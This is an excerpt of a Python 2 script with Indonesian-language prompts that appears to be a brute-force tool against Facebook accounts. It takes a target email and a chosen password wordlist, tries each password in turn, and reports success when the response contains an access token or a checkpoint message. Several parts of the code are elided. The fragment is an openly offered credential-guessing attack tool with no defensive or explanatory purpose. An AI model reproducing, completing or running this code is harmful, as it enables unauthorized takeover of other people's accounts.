...
def ceknet():
    try:
    	os.system('reset')
        print internet
        print '\r\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mSabar sek proses'
        time.sleep(2)
        toolbar_width = 25
...
def start():
        try:
            ...
            passw = raw_input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m File Wordlist Pilih (pass1.txt, pass2.txt, pass3.txt)  \033[31;1m:\033[32;1m ')
            total = open(passw, 'r')
            total = total.readlines()
            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTarget\033[36;1m :\033[32;1m ' + email
            time.sleep(3.0)
            print '\033[34;1m[\033[37;1m^\033[34;1m] \033[37;1mTotal List (Proses lama) \033[36;1m:\033[32;1m ' + str(len(total))
            time.sleep(3.0)
            print
            sandi = open(passw, 'r')
            for pw in sandi:
                try:
                    pw = pw.replace('\n', '')
                    sys.stdout.write('\r\033[32;1m[\033[37;1m=\033[32;1m]\033[34;1m Start BruteForce \033[37;1m>\033[35;1m '+email+'\033[37;1m >\033[35;1m '+pw)
                    sys.stdout.flush()
                    ...
                    if 'access_token' in mpsh:
                        ...
                        print '\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m MANTAB'
                        ...
                        if 'www.facebook.com' in mpsh['error_msg']:
                            ...
                            print '\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[33;1m MANCING MANIA MANTABB!!!'
            ...
            print '\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mAlamat wordlist salah cek meneh'
